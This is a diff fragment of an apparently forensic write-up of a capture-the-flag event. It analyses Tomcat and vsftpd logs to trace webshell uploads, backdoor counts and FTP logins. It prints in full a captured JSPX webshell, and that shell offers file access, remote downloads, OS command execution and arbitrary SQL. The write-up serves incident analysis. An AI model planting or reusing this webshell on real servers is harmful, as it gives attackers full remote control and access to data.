-10.0.0.1 - - [05/Apr/2019:22:27:57 +0200] &quot;GET /toto.jsp HTTP/1.1&quot; 500 3396
-10.0.0.1 - - [05/Apr/2019:22:28:22 +0200] &quot;PUT /toto.jsp/ HTTP/1.1&quot; 204 -
-10.0.0.1 - - [05/Apr/2019:22:28:25 +0200] &quot;GET /toto.jsp HTTP/1.1&quot; 500 3396
-10.0.0.1 - - [05/Apr/2019:22:28:27 +0200] &quot;GET /toto.jsp HTTP/1.1&quot; 200 13
-10.0.0.1 - - [05/Apr/2019:22:29:02 +0200] &quot;PUT /toto.jsp/ HTTP/1.1&quot; 204 -
-10.0.0.1 - - [05/Apr/2019:22:29:08 +0200] &quot;GET /toto.jsp HTTP/1.1&quot; 500 3396
-10.0.0.1 - - [05/Apr/2019:22:29:09 +0200] &quot;GET /toto.jsp HTTP/1.1&quot; 200 151
-10.0.0.1 - - [05/Apr/2019:22:29:15 +0200] &quot;GET /toto.jsp?cmd=whoami HTTP/1.1&quot; 500 3396
-10.0.0.1 - - [05/Apr/2019:22:29:17 +0200] &quot;GET /toto.jsp?cmd=whoami HTTP/1.1&quot; 200 178
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;.jsp?&#34;</span> | head
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:29:15 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /toto.jsp?cmd=whoami HTTP/1.1&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">3396</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:29:17 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /toto.jsp?cmd=whoami HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">178</span>
+</span></span></code></pre></div><p><code>toto.js</code> was the first webshell and was created at <code>22:29:17</code>.</p>
+<pre tabindex="0"><code>root@project-server:~ $ cat full-access.log | grep &#34;toto.jsp&#34;
+10.0.0.1 - - [05/Apr/2019:22:27:34 +0200] &#34;PUT /toto.jsp/ HTTP/1.1&#34; 201 -
+10.0.0.1 - - [05/Apr/2019:22:27:40 +0200] &#34;GET /toto.jsp HTTP/1.1&#34; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:27:50 +0200] &#34;GET /toto.jsp HTTP/1.1&#34; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:27:57 +0200] &#34;GET /toto.jsp HTTP/1.1&#34; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:28:22 +0200] &#34;PUT /toto.jsp/ HTTP/1.1&#34; 204 -
+10.0.0.1 - - [05/Apr/2019:22:28:25 +0200] &#34;GET /toto.jsp HTTP/1.1&#34; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:28:27 +0200] &#34;GET /toto.jsp HTTP/1.1&#34; 200 13
+10.0.0.1 - - [05/Apr/2019:22:29:02 +0200] &#34;PUT /toto.jsp/ HTTP/1.1&#34; 204 -
+10.0.0.1 - - [05/Apr/2019:22:29:08 +0200] &#34;GET /toto.jsp HTTP/1.1&#34; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:29:09 +0200] &#34;GET /toto.jsp HTTP/1.1&#34; 200 151
+10.0.0.1 - - [05/Apr/2019:22:29:15 +0200] &#34;GET /toto.jsp?cmd=whoami HTTP/1.1&#34; 500 3396
+10.0.0.1 - - [05/Apr/2019:22:29:17 +0200] &#34;GET /toto.jsp?cmd=whoami HTTP/1.1&#34; 200 178
 </code></pre><h2 id="number-of-backdoor">Number of backdoor</h2>
 <p>How many backdoors was put on the server during the challenge ?</p>
-<pre tabindex="0"><code>root@project-server:~# cat full-access.log | grep &quot;PUT&quot; | grep &quot;201 -&quot; | grep &quot;jsp&quot; | wc -l
+<pre tabindex="0"><code>root@project-server:~# cat full-access.log | grep &#34;PUT&#34; | grep &#34;201 -&#34; | grep &#34;jsp&#34; | wc -l
 124
-</code></pre><pre tabindex="0"><code>root@project-server:/opt/tomcat/webapps/ROOT# ls -al | grep &quot;jsp&quot; | wc -l
+</code></pre><pre tabindex="0"><code>root@project-server:/opt/tomcat/webapps/ROOT# ls -al | grep &#34;jsp&#34; | wc -l
 114
 </code></pre><p>Strange. Why don&rsquo;t we have the same number ?</p>
 <p>Let&rsquo;s sort the list and get a diff.</p>
@@ -486,51 +485,51 @@ Challengers didn&rsquo;t delete their traces. Not really discreet :)</p>
 <p>There is an interesting backdoor. I will study it later.</p>
 <pre tabindex="0"><code>root@project-server:/opt/tomcat/webapps/ROOT# cat shatt.jspx
 
-&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xmlns:c=&quot;http://java.sun.com/jsp/jstl/core&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page contentType=&quot;text/html&quot; pageEncoding=&quot;UTF-8&quot; /&gt;&lt;jsp:directive.page import=&quot;java.io.*&quot;/&gt;&lt;jsp:directive.page import=&quot;java.util.*&quot;/&gt;&lt;jsp:directive.page import=&quot;java.net.*&quot;/&gt;&lt;jsp:directive.page import=&quot;java.sql.*&quot;/&gt;&lt;jsp:directive.page import=&quot;java.text.*&quot;/&gt;&lt;jsp:declaration&gt;String Pwd=&quot;023&quot;;String cs=&quot;UTF-8&quot;;String EC(String s)throws Exception{return new String(s.getBytes(&quot;ISO-8859-1&quot;),cs);}Connection GC(String s)throws Exception{String[] x=s.trim().split(&quot;\r\n&quot;);Class.forName(x[0].trim());if(x[1].indexOf(&quot;jdbc:oracle&quot;)!=-1){return DriverManager.getConnection(x[1].trim()+&quot;:&quot;+x[4],x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);}else{Connection c=DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[2],x[3].equalsIgnoreCase(&quot;[/null]&quot;)?&quot;&quot;:x[3]);if(x.length&gt;4){c.setCatalog(x[4]);}return c;}}void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i&amp;lt;r.length;i++){sb.append(r[i].toString().substring(0,2));}}void BB(String s,StringBuffer sb)throws Exception{File oF=new File(s),l[]=oF.listFiles();String sT,sQ,sF=&quot;&quot;;java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);for(int i=0; i&amp;lt;l.length; i++){dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?&quot;R&quot;:&quot;&quot;;sQ +=l[i].canWrite()?&quot; W&quot;:&quot;&quot;;if(l[i].isDirectory()){sb.append(l[i].getName()+&quot;/\t&quot;+sT+&quot;\t&quot;+l[i].length()+&quot;\t&quot;+sQ+&quot;\n&quot;);}else{sF+=l[i].getName()+&quot;\t&quot;+sT+&quot;\t&quot;+l[i].length()+&quot;\t&quot;+sQ+&quot;\n&quot;;}}sb.append(sF);}void EE(String s)throws Exception{File f=new File(s);if(f.isDirectory()){File x[]=f.listFiles();for(int k=0; k &amp;lt; x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write((&quot;-&gt;&quot;+&quot;|&quot;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write((&quot;|&quot;+&quot;&amp;lt;-&quot;).getBytes(),0,3);os.close();is.close();}void GG(String s,String d)throws Exception{String h=&quot;0123456789ABCDEF&quot;;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0; i&amp;lt;d.length();i+=2){os.write((h.indexOf(d.charAt(i)) &amp;lt;&amp;lt; 4 | h.indexOf(d.charAt(i+1))));}os.close();}void HH(String s,String d)throws Exception{File sf=new File(s),df=new File(d);if(sf.isDirectory()){if(!df.exists()){df.mkdir();}File z[]=sf.listFiles();for(int j=0; j&amp;lt;z.length; j++){HH(s+&quot;/&quot;+z[j].getName(),d+&quot;/&quot;+z[j].getName());}}else{FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}void MM(InputStream is,StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null){sb.append(l+&quot;\r\n&quot;);}}void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=s.indexOf(&quot;jdbc:oracle&quot;)!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();while(r.next()){sb.append(r.getString(1)+&quot;\t&quot;);}r.close();c.close();}void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] x=s.trim().split(&quot;\r\n&quot;);ResultSet r=c.getMetaData().getTables(null,s.indexOf(&quot;jdbc:oracle&quot;)!=-1?x.length&gt;5?x[5]:x[4]:null,&quot;%&quot;,new String[]{&quot;TABLE&quot;});while(r.next()){sb.append(r.getString(&quot;TABLE_NAME&quot;)+&quot;\t&quot;);}r.close();c.close();}void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split(&quot;\r\n&quot;);Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(&quot;select * from &quot;+x[x.length-1]);ResultSetMetaData d=r.getMetaData();for(int i=1;i&amp;lt;=d.getColumnCount();i++){sb.append(d.getColumnName(i)+&quot; (&quot;+d.getColumnTypeName(i)+&quot;)\t&quot;);}r.close();m.close();c.close();}void QQ(String cs,String s,String q,StringBuffer sb,String p)throws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q.indexOf(&quot;--f:&quot;)!=-1?q.substring(0,q.indexOf(&quot;--f:&quot;)):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(int i=1; i &amp;lt;=n; i++){sb.append(d.getColumnName(i)+&quot;\t|\t&quot;);}sb.append(&quot;\r\n&quot;);if(q.indexOf(&quot;--f:&quot;)!=-1){File file=new File(p);if(q.indexOf(&quot;-to:&quot;)==-1){file.mkdir();}bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(&quot;-to:&quot;)!=-1?p.trim():p+q.substring(q.indexOf(&quot;--f:&quot;)+4,q.length()).trim()),true),cs));}while(r.next()){for(int i=1; i&amp;lt;=n;i++){if(q.indexOf(&quot;--f:&quot;)!=-1){bw.write(r.getObject(i)+&quot;&quot;+&quot;\t&quot;);bw.flush();}else{sb.append(r.getObject(i)+&quot;&quot;+&quot;\t|\t&quot;);}}if(bw!=null){bw.newLine();}sb.append(&quot;\r\n&quot;);}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append(&quot;Result\t|\t\r\n&quot;);try{m.executeUpdate(q);sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);}catch(Exception ee){sb.append(ee.toString()+&quot;\t|\t\r\n&quot;);}}m.close();c.close();}&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;cs=request.getParameter(&quot;z0&quot;)!=null?request.getParameter(&quot;z0&quot;)+&quot;&quot;:cs;response.setContentType(&quot;text/html&quot;);response.setCharacterEncoding(cs);StringBuffer sb=new StringBuffer(&quot;&quot;);try{String Z=EC(request.getParameter(Pwd)+&quot;&quot;);String z1=EC(request.getParameter(&quot;z1&quot;)+&quot;&quot;);String z2=EC(request.getParameter(&quot;z2&quot;)+&quot;&quot;);sb.append(&quot;-&gt;&quot;+&quot;|&quot;);String s=request.getSession().getServletContext().getRealPath(&quot;/&quot;);if(Z.equals(&quot;A&quot;)){sb.append(s+&quot;\t&quot;);if(!s.substring(0,1).equals(&quot;/&quot;)){AA(sb);}}else if(Z.equals(&quot;B&quot;)){BB(z1,sb);}else if(Z.equals(&quot;C&quot;)){String l=&quot;&quot;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null){sb.append(l+&quot;\r\n&quot;);}br.close();}else if(Z.equals(&quot;D&quot;)){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(&quot;1&quot;);}else if(Z.equals(&quot;E&quot;)){EE(z1);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;F&quot;)){FF(z1,response);}else if(Z.equals(&quot;G&quot;)){GG(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;H&quot;)){HH(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;I&quot;)){II(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;J&quot;)){JJ(z1);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;K&quot;)){KK(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;L&quot;)){LL(z1,z2);sb.append(&quot;1&quot;);}else if(Z.equals(&quot;M&quot;)){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(&quot;N&quot;)){NN(z1,sb);}else if(Z.equals(&quot;O&quot;)){OO(z1,sb);}else if(Z.equals(&quot;P&quot;)){PP(z1,sb);}else if(Z.equals(&quot;Q&quot;)){QQ(cs,z1,z2,sb,z2.indexOf(&quot;-to:&quot;)!=-1?z2.substring(z2.indexOf(&quot;-to:&quot;)+4,z2.length()):s.replaceAll(&quot;\\\\&quot;,&quot;/&quot;)+&quot;images/&quot;);}}catch(Exception e){sb.append(&quot;ERROR&quot;+&quot;:// &quot;+e.toString());}sb.append(&quot;|&quot;+&quot;&amp;lt;-&quot;);out.print(sb.toString());&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;
+&lt;jsp:root xmlns:jsp=&#34;http://java.sun.com/JSP/Page&#34; xmlns=&#34;http://www.w3.org/1999/xhtml&#34; xmlns:c=&#34;http://java.sun.com/jsp/jstl/core&#34; version=&#34;1.2&#34;&gt;&lt;jsp:directive.page contentType=&#34;text/html&#34; pageEncoding=&#34;UTF-8&#34; /&gt;&lt;jsp:directive.page import=&#34;java.io.*&#34;/&gt;&lt;jsp:directive.page import=&#34;java.util.*&#34;/&gt;&lt;jsp:directive.page import=&#34;java.net.*&#34;/&gt;&lt;jsp:directive.page import=&#34;java.sql.*&#34;/&gt;&lt;jsp:directive.page import=&#34;java.text.*&#34;/&gt;&lt;jsp:declaration&gt;String Pwd=&#34;023&#34;;String cs=&#34;UTF-8&#34;;String EC(String s)throws Exception{return new String(s.getBytes(&#34;ISO-8859-1&#34;),cs);}Connection GC(String s)throws Exception{String[] x=s.trim().split(&#34;\r\n&#34;);Class.forName(x[0].trim());if(x[1].indexOf(&#34;jdbc:oracle&#34;)!=-1){return DriverManager.getConnection(x[1].trim()+&#34;:&#34;+x[4],x[2].equalsIgnoreCase(&#34;[/null]&#34;)?&#34;&#34;:x[2],x[3].equalsIgnoreCase(&#34;[/null]&#34;)?&#34;&#34;:x[3]);}else{Connection c=DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase(&#34;[/null]&#34;)?&#34;&#34;:x[2],x[3].equalsIgnoreCase(&#34;[/null]&#34;)?&#34;&#34;:x[3]);if(x.length&gt;4){c.setCatalog(x[4]);}return c;}}void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i&amp;lt;r.length;i++){sb.append(r[i].toString().substring(0,2));}}void BB(String s,StringBuffer sb)throws Exception{File oF=new File(s),l[]=oF.listFiles();String sT,sQ,sF=&#34;&#34;;java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(&#34;yyyy-MM-dd HH:mm:ss&#34;);for(int i=0; i&amp;lt;l.length; i++){dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?&#34;R&#34;:&#34;&#34;;sQ +=l[i].canWrite()?&#34; W&#34;:&#34;&#34;;if(l[i].isDirectory()){sb.append(l[i].getName()+&#34;/\t&#34;+sT+&#34;\t&#34;+l[i].length()+&#34;\t&#34;+sQ+&#34;\n&#34;);}else{sF+=l[i].getName()+&#34;\t&#34;+sT+&#34;\t&#34;+l[i].length()+&#34;\t&#34;+sQ+&#34;\n&#34;;}}sb.append(sF);}void EE(String s)throws Exception{File f=new File(s);if(f.isDirectory()){File x[]=f.listFiles();for(int k=0; k &amp;lt; x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write((&#34;-&gt;&#34;+&#34;|&#34;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write((&#34;|&#34;+&#34;&amp;lt;-&#34;).getBytes(),0,3);os.close();is.close();}void GG(String s,String d)throws Exception{String h=&#34;0123456789ABCDEF&#34;;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0; i&amp;lt;d.length();i+=2){os.write((h.indexOf(d.charAt(i)) &amp;lt;&amp;lt; 4 | h.indexOf(d.charAt(i+1))));}os.close();}void HH(String s,String d)throws Exception{File sf=new File(s),df=new File(d);if(sf.isDirectory()){if(!df.exists()){df.mkdir();}File z[]=sf.listFiles();for(int j=0; j&amp;lt;z.length; j++){HH(s+&#34;/&#34;+z[j].getName(),d+&#34;/&#34;+z[j].getName());}}else{FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(&#34;yyyy-MM-dd HH:mm:ss&#34;);java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}void MM(InputStream is,StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null){sb.append(l+&#34;\r\n&#34;);}}void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=s.indexOf(&#34;jdbc:oracle&#34;)!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();while(r.next()){sb.append(r.getString(1)+&#34;\t&#34;);}r.close();c.close();}void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] x=s.trim().split(&#34;\r\n&#34;);ResultSet r=c.getMetaData().getTables(null,s.indexOf(&#34;jdbc:oracle&#34;)!=-1?x.length&gt;5?x[5]:x[4]:null,&#34;%&#34;,new String[]{&#34;TABLE&#34;});while(r.next()){sb.append(r.getString(&#34;TABLE_NAME&#34;)+&#34;\t&#34;);}r.close();c.close();}void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split(&#34;\r\n&#34;);Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(&#34;select * from &#34;+x[x.length-1]);ResultSetMetaData d=r.getMetaData();for(int i=1;i&amp;lt;=d.getColumnCount();i++){sb.append(d.getColumnName(i)+&#34; (&#34;+d.getColumnTypeName(i)+&#34;)\t&#34;);}r.close();m.close();c.close();}void QQ(String cs,String s,String q,StringBuffer sb,String p)throws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q.indexOf(&#34;--f:&#34;)!=-1?q.substring(0,q.indexOf(&#34;--f:&#34;)):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(int i=1; i &amp;lt;=n; i++){sb.append(d.getColumnName(i)+&#34;\t|\t&#34;);}sb.append(&#34;\r\n&#34;);if(q.indexOf(&#34;--f:&#34;)!=-1){File file=new File(p);if(q.indexOf(&#34;-to:&#34;)==-1){file.mkdir();}bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(&#34;-to:&#34;)!=-1?p.trim():p+q.substring(q.indexOf(&#34;--f:&#34;)+4,q.length()).trim()),true),cs));}while(r.next()){for(int i=1; i&amp;lt;=n;i++){if(q.indexOf(&#34;--f:&#34;)!=-1){bw.write(r.getObject(i)+&#34;&#34;+&#34;\t&#34;);bw.flush();}else{sb.append(r.getObject(i)+&#34;&#34;+&#34;\t|\t&#34;);}}if(bw!=null){bw.newLine();}sb.append(&#34;\r\n&#34;);}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append(&#34;Result\t|\t\r\n&#34;);try{m.executeUpdate(q);sb.append(&#34;Execute Successfully!\t|\t\r\n&#34;);}catch(Exception ee){sb.append(ee.toString()+&#34;\t|\t\r\n&#34;);}}m.close();c.close();}&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;cs=request.getParameter(&#34;z0&#34;)!=null?request.getParameter(&#34;z0&#34;)+&#34;&#34;:cs;response.setContentType(&#34;text/html&#34;);response.setCharacterEncoding(cs);StringBuffer sb=new StringBuffer(&#34;&#34;);try{String Z=EC(request.getParameter(Pwd)+&#34;&#34;);String z1=EC(request.getParameter(&#34;z1&#34;)+&#34;&#34;);String z2=EC(request.getParameter(&#34;z2&#34;)+&#34;&#34;);sb.append(&#34;-&gt;&#34;+&#34;|&#34;);String s=request.getSession().getServletContext().getRealPath(&#34;/&#34;);if(Z.equals(&#34;A&#34;)){sb.append(s+&#34;\t&#34;);if(!s.substring(0,1).equals(&#34;/&#34;)){AA(sb);}}else if(Z.equals(&#34;B&#34;)){BB(z1,sb);}else if(Z.equals(&#34;C&#34;)){String l=&#34;&#34;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null){sb.append(l+&#34;\r\n&#34;);}br.close();}else if(Z.equals(&#34;D&#34;)){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(&#34;1&#34;);}else if(Z.equals(&#34;E&#34;)){EE(z1);sb.append(&#34;1&#34;);}else if(Z.equals(&#34;F&#34;)){FF(z1,response);}else if(Z.equals(&#34;G&#34;)){GG(z1,z2);sb.append(&#34;1&#34;);}else if(Z.equals(&#34;H&#34;)){HH(z1,z2);sb.append(&#34;1&#34;);}else if(Z.equals(&#34;I&#34;)){II(z1,z2);sb.append(&#34;1&#34;);}else if(Z.equals(&#34;J&#34;)){JJ(z1);sb.append(&#34;1&#34;);}else if(Z.equals(&#34;K&#34;)){KK(z1,z2);sb.append(&#34;1&#34;);}else if(Z.equals(&#34;L&#34;)){LL(z1,z2);sb.append(&#34;1&#34;);}else if(Z.equals(&#34;M&#34;)){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals(&#34;N&#34;)){NN(z1,sb);}else if(Z.equals(&#34;O&#34;)){OO(z1,sb);}else if(Z.equals(&#34;P&#34;)){PP(z1,sb);}else if(Z.equals(&#34;Q&#34;)){QQ(cs,z1,z2,sb,z2.indexOf(&#34;-to:&#34;)!=-1?z2.substring(z2.indexOf(&#34;-to:&#34;)+4,z2.length()):s.replaceAll(&#34;\\\\&#34;,&#34;/&#34;)+&#34;images/&#34;);}}catch(Exception e){sb.append(&#34;ERROR&#34;+&#34;:// &#34;+e.toString());}sb.append(&#34;|&#34;+&#34;&amp;lt;-&#34;);out.print(sb.toString());&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;
 </code></pre><p>No hint in access log</p>
-<pre tabindex="0"><code>root@project-server:~# cat full-access.log | grep &quot;shatt.jspx&quot;
+<pre tabindex="0"><code>root@project-server:~# cat full-access.log | grep &#34;shatt.jspx&#34;
 
-10.0.0.1 - - [06/Apr/2019:02:36:09 +0200] &quot;PUT /shatt.jspx/ HTTP/1.1&quot; 201 -
-10.0.0.1 - - [06/Apr/2019:02:36:13 +0200] &quot;GET /shatt.jspx HTTP/1.1&quot; 500 5403
-10.0.0.1 - - [06/Apr/2019:02:38:34 +0200] &quot;PUT /shatt.jspx/ HTTP/1.1&quot; 204 -
+10.0.0.1 - - [06/Apr/2019:02:36:09 +0200] &#34;PUT /shatt.jspx/ HTTP/1.1&#34; 201 -
+10.0.0.1 - - [06/Apr/2019:02:36:13 +0200] &#34;GET /shatt.jspx HTTP/1.1&#34; 500 5403
+10.0.0.1 - - [06/Apr/2019:02:38:34 +0200] &#34;PUT /shatt.jspx/ HTTP/1.1&#34; 204 -
 </code></pre><h1 id="admin-server">Admin server</h1>
 <h2 id="first-access-1">First access</h2>
 <p>When did the first challenger reach the internal network ? Remember, access log on <code>project-server</code> indicates that first request was done at <code>9:48pm</code>. But on <code>admin-server</code> the first request was done at <code>9:16pm</code> (maybe because nginx ran on port 80)</p>
 <pre tabindex="0"><code>root@admin-server:~# head full-access.log 
-10.0.0.1 - - [05/Apr/2019:21:16:23 +0200] &quot;GET / HTTP/1.1&quot; 401 188 &quot;-&quot; &quot;curl/7.64.0&quot;
-10.0.0.1 - - [05/Apr/2019:21:16:34 +0200] &quot;GET / HTTP/1.1&quot; 401 188 &quot;-&quot; &quot;curl/7.64.0&quot;
-10.0.0.1 - - [05/Apr/2019:21:16:43 +0200] &quot;GET / HTTP/1.1&quot; 401 188 &quot;-&quot; &quot;curl/7.64.0&quot;
+10.0.0.1 - - [05/Apr/2019:21:16:23 +0200] &#34;GET / HTTP/1.1&#34; 401 188 &#34;-&#34; &#34;curl/7.64.0&#34;
+10.0.0.1 - - [05/Apr/2019:21:16:34 +0200] &#34;GET / HTTP/1.1&#34; 401 188 &#34;-&#34; &#34;curl/7.64.0&#34;
+10.0.0.1 - - [05/Apr/2019:21:16:43 +0200] &#34;GET / HTTP/1.1&#34; 401 188 &#34;-&#34; &#34;curl/7.64.0&#34;
 </code></pre><h2 id="first-ftp-connexion">First ftp connexion</h2>
 <p>The first valid login on the ftp service was done at <code>10:47pm</code>.</p>
-<pre tabindex="0"><code>root@admin-server:~# cat full-vstfpd.log | grep &quot;LOGIN&quot;
-Fri Apr  5 22:02:02 2019 [pid 1476] [backup] FAIL LOGIN: Client &quot;::ffff:10.0.0.1&quot;
-Fri Apr  5 22:02:19 2019 [pid 1480] [backup] FAIL LOGIN: Client &quot;::ffff:10.0.0.1&quot;
-Fri Apr  5 22:02:27 2019 [pid 1480] [backup] FAIL LOGIN: Client &quot;::ffff:10.0.0.1&quot;
-Fri Apr  5 22:02:41 2019 [pid 1480] [backup] FAIL LOGIN: Client &quot;::ffff:10.0.0.1&quot;
-Fri Apr  5 22:47:04 2019 [pid 1656] [backup] OK LOGIN: Client &quot;::ffff:10.0.0.1&quot;
+<pre tabindex="0"><code>root@admin-server:~# cat full-vstfpd.log | grep &#34;LOGIN&#34;
+Fri Apr  5 22:02:02 2019 [pid 1476] [backup] FAIL LOGIN: Client &#34;::ffff:10.0.0.1&#34;
+Fri Apr  5 22:02:19 2019 [pid 1480] [backup] FAIL LOGIN: Client &#34;::ffff:10.0.0.1&#34;
+Fri Apr  5 22:02:27 2019 [pid 1480] [backup] FAIL LOGIN: Client &#34;::ffff:10.0.0.1&#34;
+Fri Apr  5 22:02:41 2019 [pid 1480] [backup] FAIL LOGIN: Client &#34;::ffff:10.0.0.1&#34;
+Fri Apr  5 22:47:04 2019 [pid 1656] [backup] OK LOGIN: Client &#34;::ffff:10.0.0.1&#34;
 </code></pre><h2 id="total-ftp-connexion">Total ftp connexion</h2>
 <p>There was <strong>42 connexions</strong> established on admin-server ftp server during the ctf.</p>
-<pre tabindex="0"><code>root@admin-server:~# cat full-vstfpd.log | grep &quot;OK LOGIN&quot; | wc -l
+<pre tabindex="0"><code>root@admin-server:~# cat full-vstfpd.log | grep &#34;OK LOGIN&#34; | wc -l
 42
 </code></pre><h2 id="first-creds-download">First creds download</h2>
 <p>And first downloading of encrypted credentials was done at <code>10:48pm</code></p>
-<pre tabindex="0"><code>root@admin-server:~# cat full-vstfpd.log | grep &quot;OK&quot;
-Fri Apr  5 22:47:04 2019 [pid 1656] [backup] OK LOGIN: Client &quot;::ffff:10.0.0.1&quot;
